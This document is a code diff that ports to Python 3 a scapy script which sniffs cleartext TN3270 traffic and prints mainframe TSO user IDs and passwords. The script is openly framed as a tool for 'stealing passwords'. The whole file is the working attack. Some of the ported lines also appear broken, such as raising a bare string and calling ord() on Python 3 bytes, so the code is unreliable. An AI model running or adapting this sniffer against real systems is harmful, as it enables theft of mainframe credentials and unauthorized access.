@@ -2,21 +2,22 @@
 
 
 ##################################################################
-# Script to capture TSO login credentials			 #
+# Script to capture TSO login credentials	            		 #
 #                                                                #
 # Requirements: Python, scapy and IP/Port of mainframe           #
 # Created by: Soldier of Fortran (@mainframed767)                #
-# Usage: Given an interface, IP and port this script will 	 #
+# Usage: Given an interface, IP and port this script will 	     #
 # try to sniff mainframe user IDs and  passwords sent over       #
 # cleartext using TN3270 (tested against x3270 and TN3270X)      #
 #                                                                #
 # Copyright GPL 2012                                             #
+# Revised for Python3 2023                                       #
 ##################################################################
 
 from scapy.all import * #needed for scapy
 import argparse #needed for argument parsing
 
-print '''
+print ('''
           ____________________________
         /|............................|
        | |:         Mainframe        :|
@@ -31,7 +32,7 @@ print '''
        `.___/ /====/ /=//=/ /====/____/
             `--------------------'
        Stealing passwords like its 1985
-'''
+''')
 
 
 #start argument parser
@@ -48,8 +49,8 @@ interface = results.interface
 port = results.port
 ip_address = results.ip
 
-print "-{X}- Mainframe: ", ip_address,':',port
-print "-{X}- Sniffer started on interface:", interface
+print ("-{X}- Mainframe: ", ip_address,':',port)
+print ("-{X}- Sniffer started on interface:", interface)
 
 
 
@@ -76,13 +77,13 @@ e2a = [
 
 def EbcdicToAscii(s):
     if type(s) != type(""):
-        raise "Bad data", "Expected a string argument"
+        raise ("Expected a string argument")
 
     if len(s) == 0:  return s
 
     new = ""
 
-    for i in xrange(len(s)):
+    for i in range(len(s)):
         new += chr(e2a[ord(s[i])])
     return new
 
@@ -96,10 +97,9 @@ def sniffTSO(pkt):
 		# If the destination and port match and the length of data is less than 200 chars 
 		# convert the raw string to an ebcdic string so we can search, etc
 		sniffed = EbcdicToAscii(raw[1:-1])
-		#print "[+] Length is", raw.__len__()
-		#print sniffed
-		#print "[+] Ordinals: ",
-		for i in xrange(len(raw)):
+		#print ("[+] Length is", raw.__len__())
+		#print (sniffed)
+		for i in range(len(raw)):
 		#Logons start with 125 193 215 17 64 90 ordinals so we check for those
 			if ord(raw[i]) == 125 and \
 			   ord(raw[i+1]) == 193 and \
@@ -107,19 +107,18 @@ def sniffTSO(pkt):
 			   ord(raw[i+3]) == 17 and \
 			   ord(raw[i+4]) == 64 and \
 			   ord(raw[i+5]) == 90:
-				print "-{X}- Mainframe UserID:",sniffed[i+5:-1]
+				print ("-{X}- Mainframe UserID:",sniffed[i+5:-1])
 		#Password always contain ordinals 125 201 ### 17 201 195 where ### can be anything
 			if ord(raw[i]) == 125 and \
 			   ord(raw[i+1]) == 201 and \
 			   ord(raw[i+3]) == 17 and \
 			   ord(raw[i+4]) == 201 and \
 			   ord(raw[i+5]) == 195:
-				print "-{X}- Mainframe Password:",sniffed[i+5:-1]
-    		#print ord(raw[i]),
-	#print ""	
+				print ("-{X}- Mainframe Password:",sniffed[i+5:-1])
+    		#print (ord(raw[i]),)
+	#print ("")	
 		
 
 # Start scapy sniffer on interface and 
 # pass all packets to the function sniffTSO
 sniff(iface=interface, prn=sniffTSO)
-
